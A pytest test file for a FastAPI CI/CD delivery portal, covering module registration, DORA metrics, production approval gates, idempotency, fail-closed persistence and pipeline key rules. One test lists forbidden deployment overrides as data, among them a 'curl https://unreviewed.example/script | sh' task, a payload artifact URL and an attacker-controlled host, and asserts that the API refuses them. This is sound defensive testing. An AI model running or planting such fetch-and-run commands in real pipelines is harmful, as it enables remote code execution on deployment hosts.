from contextlib import contextmanager

from fastapi.testclient import TestClient

import app.main as main
from app.main import app


client = TestClient(app)
MACHINE_HEADERS = {'Authorization': 'Bearer netci-local-pipeline-key'}


def failing_on(method_name):
    """A database whose transactions fail on one write, and roll back everything else.

    Injecting the failure at the store seam -- rather than stubbing a service method --
    is what makes the assertion meaningful: the endpoint must answer 503 and the record
    must be absent afterwards, which is only true if the transaction really rolled back.
    """

    real = main.portal.database

    class FailingSession:
        def __init__(self, inner):
            self._inner = inner

        def __getattr__(self, name):
            if name == method_name:
                def fail(*_args, **_kwargs):
                    raise RuntimeError('database offline')
                return fail
            return getattr(self._inner, name)

    class FailingDatabase:
        describe = real.describe
        health = real.health

        @contextmanager
        def transaction(self):
            with real.transaction() as inner:
                yield FailingSession(inner)

    return FailingDatabase()


class UnreachableDatabase:
    """A configured PostgreSQL that cannot be reached."""

    @staticmethod
    def describe():
        return 'postgresql'

    @staticmethod
    def health():
        return 'unavailable: connection refused'


def setup_function():
    main.platform.reset()
    main.portal.reset()


def test_portal_dashboard_has_reference_systems_and_four_dora_metrics():
    response = client.get('/portal/dashboard')

    assert response.status_code == 200
    body = response.json()
    assert body['kpis']['systems'] == 3
    assert body['kpis']['modules'] == 3
    assert len(body['pipelineActivity']) == 7
    assert {item['id'] for item in body['systems']} == {'hello-container', 'hello-kubernetes', 'hello-systemd-go'}

    dora = client.get('/modules/hello-container/dora')
    assert dora.status_code == 200
    assert [metric['label'] for metric in dora.json()['metrics']] == [
        'Deployment Frequency',
        'Lead Time for Changes',
        'Change Failure Rate',
        'Time to Restore Service',
    ]


def test_portal_system_detail_and_module_overview_are_hierarchical():
    system = client.get('/systems/hello-container')
    assert system.status_code == 200
    assert system.json()['moduleCount'] == 1
    assert {item['id'] for item in system.json()['modules']} == {'hello-container'}

    overview = client.get('/modules/hello-container/overview')
    assert overview.status_code == 200
    assert overview.json()['module']['name'] == 'Hello Container'
    assert overview.json()['mergeRequests'] == []
    assert overview.json()['trends']['securityFindings'] is None


def test_module_general_settings_are_persisted_by_the_api():
    updated = client.patch('/modules/hello-container', json={
        'displayName': 'Container Service',
        'moduleType': 'Backend',
        'description': 'Updated through the live settings endpoint',
    })

    assert updated.status_code == 200
    assert client.get('/modules/hello-container').json()['name'] == 'Container Service'


def test_portal_can_create_system_and_attach_a_delivery_application_as_module():
    created_system = client.post('/systems', json={
        'id': 'billing-platform',
        'unit': 'Technology Platform Center',
        'description': 'Billing delivery system',
    })
    assert created_system.status_code == 201

    created_module = client.post('/systems/billing-platform/modules', headers={'Idempotency-Key': 'module-1'}, json={
        'name': 'billing-api',
        'displayName': 'Billing Service API',
        'repositoryUrl': 'https://github.com/example/billing-api',
        'pipelineTemplate': 'container-ci-cd-v1',
        'runtime': 'docker',
        'moduleType': 'Backend',
        'description': 'Billing API',
        'defaultEnvironment': 'dev',
        'stages': ['checkout', 'unit-test', 'build', 'publish'],
        'pipelineConfig': {
            'runner': 'docker-linux',
            'strategy': 'Gitflow',
            'pipelines': {'CI': {'branch': 'main', 'coverageReportPath': 'coverage/lcov.info', 'stages': ['checkout', 'unit-test']}},
        },
        'deploymentEnvironments': [{
            'displayName': 'Development',
            'environment': 'dev',
            'runtime': 'docker',
            'servers': ['localhost'],
            'tasks': ['Restart service', 'Health check'],
            'taskSettings': {'healthCheck': {'script': 'curl -f http://localhost/health', 'retries': 3, 'delay': '10s'}},
        }],
    })
    assert created_module.status_code == 201
    assert created_module.json()['systemId'] == 'billing-platform'
    assert created_module.json()['name'] == 'Billing Service API'
    assert created_module.json()['applicationId']
    assert created_module.json()['deploymentEnvironments'] == [{
        'displayName': 'Development',
        'environment': 'dev',
        'runtime': 'docker',
        'servers': ['localhost'],
        'tasks': ['Restart service', 'Health check'],
        'taskSettings': {'healthCheck': {'script': 'curl -f http://localhost/health', 'retries': 3, 'delay': '10s'}},
        'kubeconfigRef': None,
        'namespace': None,
    }]
    assert created_module.json()['pipelineConfig']['runner'] == 'docker-linux'
    assert client.get('/systems/billing-platform').json()['moduleCount'] == 1
    application = next(item for item in client.get('/applications').json() if item['id'] == created_module.json()['applicationId'])
    assert application['stages'] == ['checkout', 'unit-test', 'build', 'publish']


def test_system_owner_cannot_be_forged_in_the_request_body():
    response = client.post('/systems', json={
        'id': 'forged-owner-system',
        'unit': 'Technology Platform Center',
        'description': 'The verified caller must own this record',
        'owner': 'someone-else',
    })

    assert response.status_code == 422
    assert response.json()['code'] == 'VALIDATION_ERROR'


def test_production_requester_cannot_be_forged_in_the_request_body():
    response = client.post('/production-requests', json={
        'requestedBy': 'someone-else',
        'scheduledFor': '2030-08-30T03:00:00+07:00',
        'modules': [{'moduleId': 'hello-container', 'version': 'v1.0.0', 'deploymentOrder': 1}],
    })

    assert response.status_code == 422
    assert response.json()['code'] == 'VALIDATION_ERROR'


def test_invalid_system_does_not_provision_an_orphan_delivery_application():
    before = len(main.platform.list_applications())

    response = client.post('/systems/missing-system/modules', json={
        'name': 'orphan-api',
        'displayName': 'Orphan API',
        'repositoryUrl': 'https://github.com/example/orphan-api',
        'pipelineTemplate': 'container-ci-cd-v1',
        'runtime': 'docker',
        'moduleType': 'Backend',
        'description': 'Must not be provisioned',
        'defaultEnvironment': 'dev',
        'stages': ['checkout', 'build'],
        'deploymentEnvironments': [{
            'displayName': 'Development',
            'environment': 'dev',
            'runtime': 'docker',
            'servers': ['localhost'],
            'tasks': ['Health check'],
        }],
    })

    assert response.status_code == 404
    assert len(main.platform.list_applications()) == before


def test_module_environment_contract_rejects_mixed_runtime_and_incomplete_targets():
    created_system = client.post('/systems', json={
        'id': 'validation-system',
        'unit': 'Technology Platform Center',
        'description': 'Target validation system',
    })
    assert created_system.status_code == 201

    mixed_runtime = client.post('/systems/validation-system/modules', json={
        'name': 'mixed-runtime-api',
        'displayName': 'Mixed Runtime API',
        'repositoryUrl': 'https://github.com/example/mixed-runtime-api',
        'pipelineTemplate': 'container-ci-cd-v1',
        'runtime': 'docker',
        'moduleType': 'Backend',
        'description': 'Mixed runtime targets',
        'defaultEnvironment': 'dev',
        'deploymentEnvironments': [{
            'displayName': 'Development',
            'environment': 'dev',
            'runtime': 'kubernetes',
            'servers': [],
            'tasks': ['Health check'],
        }],
    })
    assert mixed_runtime.status_code in (400, 422)
    assert mixed_runtime.json()['code'] in ('VALIDATION_ERROR', 'INVALID_MODULE_ENVIRONMENT')

    missing_servers = client.post('/systems/validation-system/modules', json={
        'name': 'missing-servers-api',
        'displayName': 'Missing Servers API',
        'repositoryUrl': 'https://github.com/example/missing-servers-api',
        'pipelineTemplate': 'container-ci-cd-v1',
        'runtime': 'docker',
        'moduleType': 'Backend',
        'description': 'Missing server targets',
        'defaultEnvironment': 'dev',
        'deploymentEnvironments': [{
            'displayName': 'Development',
            'environment': 'dev',
            'runtime': 'docker',
            'servers': [],
            'tasks': ['Health check'],
        }],
    })
    assert missing_servers.status_code in (400, 422)
    assert missing_servers.json()['code'] in ('VALIDATION_ERROR', 'INVALID_MODULE_ENVIRONMENT')


def test_kubernetes_module_keeps_secret_reference_and_explicit_namespace():
    response = client.post('/systems/hello-kubernetes/modules', json={
        'name': 'notification-worker',
        'displayName': 'Notification Worker',
        'repositoryUrl': 'https://github.com/example/notification-worker',
        'pipelineTemplate': 'kubernetes-ci-cd-v1',
        'runtime': 'kubernetes',
        'moduleType': 'Worker',
        'description': 'Notification worker',
        'defaultEnvironment': 'staging',
        'deploymentEnvironments': [{
            'displayName': 'Pre-production',
            'environment': 'staging',
            'runtime': 'kubernetes',
            'servers': [],
            'tasks': ['Health check'],
            'kubeconfigRef': 'netci-staging-kubeconfig',
            'namespace': 'staging',
        }],
    })

    assert response.status_code == 201
    assert response.json()['runtime'] == 'kubernetes'
    assert response.json()['deploymentEnvironments'][0]['kubeconfigRef'] == 'netci-staging-kubeconfig'
    assert response.json()['deploymentEnvironments'][0]['namespace'] == 'staging'


def test_module_pipeline_trigger_uses_the_delivery_application_contract():
    created = client.post('/systems/hello-container/modules', headers={'Idempotency-Key': 'module-trigger-1'}, json={
        'name': 'trigger-api',
        'repositoryUrl': 'https://github.com/example/trigger-api',
        'pipelineTemplate': 'container-ci-cd-v1',
        'runtime': 'docker',
        'moduleType': 'Backend',
        'description': 'Trigger test module',
        'defaultEnvironment': 'dev',
        'deploymentEnvironments': [{
            'displayName': 'Development',
            'environment': 'dev',
            'runtime': 'docker',
            'servers': ['localhost'],
            'tasks': [],
        }],
    })
    assert created.status_code == 201
    triggered = client.post('/modules/trigger-api/pipeline-runs', json={
        'commitSha': 'abcdef1234567',
        'environment': 'dev',
    })
    assert triggered.status_code == 202
    assert triggered.json()['status'] == 'queued'
    assert triggered.json()['applicationId'] == created.json()['applicationId']


def test_a_browser_supplied_deployment_target_is_refused_not_quietly_overridden():
    """These keys used to be accepted and then silently replaced.

    Neutralising an override looks identical, to the caller, to the override having
    worked -- the difference only shows up at the incident review. Refusing says so.
    """

    for forbidden in (
        {'target_hosts': ['attacker-controlled-host']},
        {'deployment_tasks': ['curl https://unreviewed.example/script | sh']},
        {'task_settings': {'healthCheck': {'script': 'exit 0'}}},
        {'kubeconfig_ref': 'someone-elses-cluster'},
        {'artifact_url': 'https://unreviewed.example/payload.tar.gz'},
    ):
        refused = client.post('/modules/hello-container/pipeline-runs', json={
            'commitSha': 'a1c4e2f', 'branch': 'main', 'environment': 'dev',
            'parameters': forbidden,
        })
        assert refused.status_code == 422, forbidden
        assert refused.json()['code'] == 'DEPLOYMENT_PARAMETER_NOT_ACCEPTED', forbidden


def test_reference_module_is_provisioned_and_can_trigger_the_demo_pipeline():
    triggered = client.post('/modules/hello-container/pipeline-runs', json={
        'commitSha': 'a1c4e2f',
        'branch': 'main',
        'environment': 'dev',
        'parameters': {'buildProfile': 'ci'},
    })

    assert triggered.status_code == 202
    assert triggered.json()['status'] == 'queued'
    assert triggered.json()['applicationId'] == client.get('/modules/hello-container').json()['applicationId']
    assert triggered.json()['parameters']['buildProfile'] == 'ci'
    # The target still comes from the module's registered configuration, not the request.
    assert triggered.json()['parameters']['target_hosts'] == ['localhost']
    assert triggered.json()['parameters']['target_environment'] == 'dev'
    assert triggered.json()['parameters']['deployment_tasks'] == []
    assert triggered.json()['parameters']['task_settings'] == {}


def test_production_request_requires_a_server_owned_production_target():
    created = client.post('/systems/hello-container/modules', json={
        'name': 'dev-only-api',
        'repositoryUrl': 'https://github.com/example/dev-only-api',
        'pipelineTemplate': 'container-ci-cd-v1',
        'runtime': 'docker',
        'defaultEnvironment': 'dev',
        'deploymentEnvironments': [{
            'displayName': 'Development',
            'environment': 'dev',
            'runtime': 'docker',
            'servers': ['dev-api-01'],
        }],
    })
    assert created.status_code == 201
    assert client.post('/modules/dev-only-api/versions', json={
        'tag': 'v1.0.0',
        'gitTagUrl': 'https://github.com/example/dev-only-api/tags/v1.0.0',
        'artifactUrl': 'https://registry.example/dev-only-api:v1.0.0',
    }).status_code == 201

    response = client.post('/production-requests', json={
        'scheduledFor': '2030-08-30T03:00:00+07:00',
        'modules': [{'moduleId': 'dev-only-api', 'version': 'v1.0.0', 'deploymentOrder': 1}],
    })

    assert response.status_code == 409
    assert response.json()['code'] == 'DEPLOYMENT_TARGET_NOT_CONFIGURED'


def test_production_request_refuses_a_version_without_verified_artifact_provenance():
    client.post('/modules/hello-container/versions', json={
        'tag': 'v1.0.0',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
        'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
    })
    req = client.post('/production-requests', headers={'Idempotency-Key': 'prod-request-test'}, json={
        'scheduledFor': '2030-08-30T03:00:00+07:00',
        'rollbackStrategy': 'automatic',
        'runAutomationTests': True,
        'modules': [{'moduleId': 'hello-container', 'version': 'v1.0.0', 'deploymentOrder': 1}],
    })
    assert req.status_code == 201
    request_id = req.json()['id']

    approved = client.post(
        f'/production-requests/{request_id}/approve',
        json={'comment': 'approved for demo'},
    )
    assert approved.status_code == 409
    assert approved.json()['code'] == 'VERSION_NOT_PROMOTABLE'


def test_production_approval_enforces_the_requested_automation_gate():
    digest = f"sha256:{'e' * 64}"
    run = client.post('/modules/hello-container/pipeline-runs', json={
        'commitSha': 'abc1234',
        'environment': 'staging',
    }).json()
    assert client.post(
        f"/pipeline-runs/{run['id']}/ci-result",
        headers=MACHINE_HEADERS,
        json={'status': 'running'},
    ).status_code == 202
    assert client.post(
        f"/pipeline-runs/{run['id']}/security-evidence",
        headers=MACHINE_HEADERS,
        json={
            'artifactDigest': digest,
            'artifactRef': f'localhost:5000/hello-container@{digest}',
            'sbom': {'generatedBy': 'syft', 'location': 's3://evidence/sbom.json', 'format': 'cyclonedx-json'},
            'vulnerabilityScan': {'scanner': 'trivy', 'status': 'passed', 'critical': 0, 'high': 0, 'medium': 0},
            'signature': {'provider': 'cosign', 'verified': True, 'certificateIdentity': 'netci-local'},
        },
    ).status_code == 202
    completed = client.post(
        f"/pipeline-runs/{run['id']}/ci-result",
        headers=MACHINE_HEADERS,
        json={'status': 'succeeded', 'artifactDigest': digest},
    ).json()
    client.post(
        f"/deployments/{completed['deployment']['id']}/result",
        headers=MACHINE_HEADERS,
        json={'status': 'healthy'},
    )
    assert client.post('/modules/hello-container/versions', json={
        'tag': 'v8.0.0',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v8.0.0',
        'artifactUrl': 'https://registry.example/hello-container@' + digest,
        'pipelineRunId': run['id'],
        'artifactDigest': digest,
    }).status_code == 201
    request = client.post('/production-requests', json={
        'scheduledFor': '2030-08-30T03:00:00+07:00',
        'rollbackStrategy': 'automatic',
        'runAutomationTests': True,
        'modules': [{'moduleId': 'hello-container', 'version': 'v8.0.0', 'deploymentOrder': 1}],
    }).json()

    blocked = client.post(f"/production-requests/{request['id']}/approve", json={})
    assert blocked.status_code == 409
    assert blocked.json()['code'] == 'AUTOMATION_GATE_FAILED'

    assert client.post(
        '/modules/hello-container/versions/v8.0.0/ci-report',
        headers=MACHINE_HEADERS,
        json={
            'coverage': 90,
            'autoTest': 'passed',
            'sast': 'passed',
            'sastIssues': 0,
            'vulnerabilities': {'critical': 0, 'high': 0, 'medium': 0},
            'commit': 'abc1234',
        },
    ).status_code == 202
    approved = client.post(f"/production-requests/{request['id']}/approve", json={})
    assert approved.status_code == 202
    deployment = client.get(f"/deployments/{approved.json()['deploymentId']}").json()
    production_run = client.get(f"/pipeline-runs/{deployment['pipelineRunId']}").json()
    assert production_run['parameters']['target_environment'] == 'prod'
    assert production_run['parameters']['target_hosts'] == ['srv-hello-container-prod']
    assert production_run['parameters']['sourcePipelineRunId'] == run['id']


def test_portal_supports_multi_module_request_with_release_plan():
    client.post('/modules/hello-container/versions', json={
        'tag': 'v1.0.0',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
        'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
    })
    client.post('/modules/hello-kubernetes/versions', json={
        'tag': 'v1.0.0',
        'gitTagUrl': 'https://github.com/example/hello-kubernetes/tags/v1.0.0',
        'artifactUrl': 'https://github.com/example/hello-kubernetes/releases/v1.0.0',
    })
    response = client.post('/production-requests', headers={'Idempotency-Key': 'prod-request-1'}, json={
        'scheduledFor': '2026-08-30T03:00:00+07:00',
        'rollbackStrategy': 'automatic',
        'runAutomationTests': True,
        'modules': [
            {'moduleId': 'hello-container', 'version': 'v1.0.0', 'deploymentOrder': 1},
            {'moduleId': 'hello-kubernetes', 'version': 'v1.0.0', 'deploymentOrder': 2},
        ],
    })

    assert response.status_code == 201
    assert len(response.json()['modules']) == 2


def test_production_request_creation_is_idempotent_for_the_same_key():
    client.post('/modules/hello-container/versions', json={
        'tag': 'v1.0.0',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
        'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
    })
    payload = {
        'scheduledFor': '2026-08-30T03:00:00+07:00',
        'rollbackStrategy': 'automatic',
        'runAutomationTests': True,
        'modules': [{'moduleId': 'hello-container', 'version': 'v1.0.0', 'deploymentOrder': 1}],
    }

    first = client.post('/production-requests', headers={'Idempotency-Key': 'prod-request-repeat'}, json=payload)
    repeated = client.post('/production-requests', headers={'Idempotency-Key': 'prod-request-repeat'}, json=payload)

    assert first.status_code == 201
    assert repeated.status_code == 201
    assert repeated.json()['id'] == first.json()['id']
    assert sum(item['id'] == first.json()['id'] for item in client.get('/production-requests').json()) == 1


def test_portal_write_fails_closed_when_configured_persistence_is_unavailable(monkeypatch):
    monkeypatch.setattr(main.portal, 'database', failing_on('insert_portal_system'))

    response = client.post('/systems', json={
        'id': 'persistence-check',
        'unit': 'Technology Platform Center',
        'description': 'Must not survive a failed write',
    })

    assert response.status_code == 503
    assert response.json()['code'] == 'PERSISTENCE_UNAVAILABLE'
    assert client.get('/systems/persistence-check').status_code == 404


def test_portal_persistence_failure_is_visible_in_health(monkeypatch):
    """An unreachable store must show as degraded, not as a green screen over a dead API."""

    monkeypatch.setattr(main.portal, 'database', UnreachableDatabase())

    health = client.get('/healthz')

    assert health.status_code == 503
    assert health.json()['status'] == 'degraded'
    assert health.json()['dependencies']['portalPersistence'] == {
        'mode': 'postgresql',
        'status': 'degraded',
        'message': 'unavailable: connection refused',
    }


def test_portal_returns_servers_and_scoped_audit_events():
    servers = client.get('/servers')
    assert servers.status_code == 200
    assert servers.json()
    assert all(item['kind'] == 'configured-runtime-target' for item in servers.json())
    assert all(item['status'] == 'unknown' for item in servers.json())

    audit = client.get('/audit-events?moduleId=hello-container')
    assert audit.status_code == 200
    assert all(item['target'] == 'hello-container' for item in audit.json())
    assert all(item['actor'] != 'operator' for item in audit.json())


def test_dcim_lookup_exposes_system_modules_and_deployment_targets():
    services = client.get('/dcim/services?query=hello')
    assert services.status_code == 200
    assert services.json() == {'source': 'dcim', 'status': 'not_configured', 'items': []}

    created = client.post('/systems', json={
        'id': 'eOffice',
        'unit': 'Digital Office',
        'description': 'Enterprise office',
    })
    assert created.status_code == 201
    assert client.get('/systems/eOffice').json()['moduleCount'] == 0

    modules = client.get('/dcim/modules?systemId=hello-container')
    assert modules.status_code == 200
    assert modules.json()['status'] == 'not_configured'
    assert modules.json()['items'] == []

    dcim_servers = client.get('/dcim/servers?systemId=hello-container&moduleId=hello-container')
    assert dcim_servers.status_code == 200
    assert dcim_servers.json()['status'] == 'not_configured'
    assert dcim_servers.json()['items'] == []

    servers = client.get('/servers')
    assert any(item['hostname'] == 'localhost' for item in servers.json())
    assert all({'ipAddress', 'environment', 'systemId'} <= item.keys() for item in servers.json())


def test_pipeline_can_publish_ci_report_for_a_module_version(monkeypatch):
    client.post('/modules/hello-container/versions', json={
        'tag': 'v1.0.0',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
        'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
    })
    monkeypatch.setenv('NETCI_PIPELINE_API_KEY', 'test-pipeline-key')
    payload = {
        'coverage': 87,
        'autoTest': 'passed',
        'sast': 'passed',
        'sastIssues': 0,
        'vulnerabilities': {'critical': 0, 'high': 0, 'medium': 2},
        'commit': 'a1c4e2f',
    }

    unauthorized = client.post('/modules/hello-container/versions/v1.0.0/ci-report', json=payload)
    assert unauthorized.status_code == 401

    response = client.post(
        '/modules/hello-container/versions/v1.0.0/ci-report',
        headers={'Authorization': 'Bearer test-pipeline-key'},
        json=payload,
    )
    assert response.status_code == 202
    assert response.json()['coverage'] == 87
    assert response.json()['vulnerabilities']['medium'] == 2

    versions = client.get('/modules/hello-container/versions').json()['items']
    version = next(item for item in versions if item['version'] == 'v1.0.0')
    assert version['ciReport']['commit'] == 'a1c4e2f'


def test_the_shared_pipeline_key_is_not_accepted_in_production_at_all(monkeypatch):
    """Workload identity replaces it; leaving it working would make the rollout cosmetic."""

    monkeypatch.setenv('NETCI_PIPELINE_API_KEY', 'a-real-shared-key')
    monkeypatch.setenv('NETCI_ENVIRONMENT', 'production')
    monkeypatch.delenv('NETCI_ALLOW_LEGACY_PIPELINE_KEY', raising=False)

    response = client.post(
        '/modules/hello-container/versions/v1.0.0/ci-report',
        headers={'Authorization': 'Bearer a-real-shared-key'},
        json={'coverage': 87, 'autoTest': 'passed', 'sast': 'passed', 'sastIssues': 0,
              'vulnerabilities': {'critical': 0, 'high': 0, 'medium': 2}, 'commit': 'a1c4e2f'},
    )

    assert response.status_code == 401
    assert response.json()['code'] == 'PIPELINE_UNAUTHORIZED'


def test_the_shared_pipeline_key_still_works_during_a_declared_migration(monkeypatch):
    """An operator gets a window to roll workloads over, but has to ask for it by name."""

    client.post('/modules/hello-container/versions', json={
        'tag': 'v1.0.0',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
        'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
    })
    monkeypatch.setenv('NETCI_PIPELINE_API_KEY', 'a-real-shared-key')
    monkeypatch.setenv('NETCI_ENVIRONMENT', 'production')
    monkeypatch.setenv('NETCI_ALLOW_LEGACY_PIPELINE_KEY', 'true')

    response = client.post(
        '/modules/hello-container/versions/v1.0.0/ci-report',
        headers={'Authorization': 'Bearer a-real-shared-key'},
        json={'coverage': 87, 'autoTest': 'passed', 'sast': 'passed', 'sastIssues': 0,
              'vulnerabilities': {'critical': 0, 'high': 0, 'medium': 2}, 'commit': 'a1c4e2f'},
    )

    assert response.status_code == 202


def test_pipeline_api_key_has_no_implicit_production_default(monkeypatch):
    client.post('/modules/hello-container/versions', json={
        'tag': 'v1.0.0',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
        'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
    })
    monkeypatch.delenv('NETCI_PIPELINE_API_KEY', raising=False)
    monkeypatch.setenv('NETCI_ENVIRONMENT', 'production')
    # Even inside the migration window there is no built-in key: the local default must
    # never become a production credential by omission.
    monkeypatch.setenv('NETCI_ALLOW_LEGACY_PIPELINE_KEY', 'true')

    response = client.post(
        '/modules/hello-container/versions/v1.0.0/ci-report',
        headers={'Authorization': 'Bearer netci-local-pipeline-key'},
        json={
            'coverage': 87,
            'autoTest': 'passed',
            'sast': 'passed',
            'sastIssues': 0,
            'vulnerabilities': {'critical': 0, 'high': 0, 'medium': 2},
            'commit': 'a1c4e2f',
        },
    )

    assert response.status_code == 503
    assert response.json()['code'] == 'PIPELINE_KEY_NOT_CONFIGURED'


def test_manual_version_registration_is_visible_to_the_portal():
    created = client.post('/modules/hello-container/versions', json={
        'tag': 'v2.5.0',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v2.5.0',
        'artifactUrl': 'https://github.com/example/hello-container/releases/v2.5.0',
    })

    assert created.status_code == 201
    assert created.json()['version'] == 'v2.5.0'
    assert client.get('/modules/hello-container/versions').json()['items'][0]['version'] == 'v2.5.0'


def test_version_registration_fails_closed_without_leaving_a_ghost_version(monkeypatch):
    monkeypatch.setattr(main.portal, 'database', failing_on('insert_portal_version'))

    response = client.post('/modules/hello-container/versions', json={
        'tag': 'v9.9.9',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v9.9.9',
        'artifactUrl': 'https://github.com/example/hello-container/releases/v9.9.9',
    })

    assert response.status_code == 503
    assert response.json()['code'] == 'PERSISTENCE_UNAVAILABLE'
    assert 'v9.9.9' not in [item['version'] for item in client.get('/modules/hello-container/versions').json()['items']]


def test_ci_report_fails_closed_without_mutating_the_projection(monkeypatch):
    client.post('/modules/hello-container/versions', json={
        'tag': 'v1.0.0',
        'gitTagUrl': 'https://github.com/example/hello-container/tags/v1.0.0',
        'artifactUrl': 'https://github.com/example/hello-container/releases/v1.0.0',
    })
    monkeypatch.setenv('NETCI_PIPELINE_API_KEY', 'test-pipeline-key')
    monkeypatch.setattr(main.portal, 'database', failing_on('insert_version_ci_report'))

    response = client.post(
        '/modules/hello-container/versions/v1.0.0/ci-report',
        headers={'Authorization': 'Bearer test-pipeline-key'},
        json={
            'coverage': 10,
            'autoTest': 'failed',
            'sast': 'failed',
            'sastIssues': 2,
            'vulnerabilities': {'critical': 1, 'high': 2, 'medium': 3},
            'commit': 'deadbeef',
        },
    )

    assert response.status_code == 503
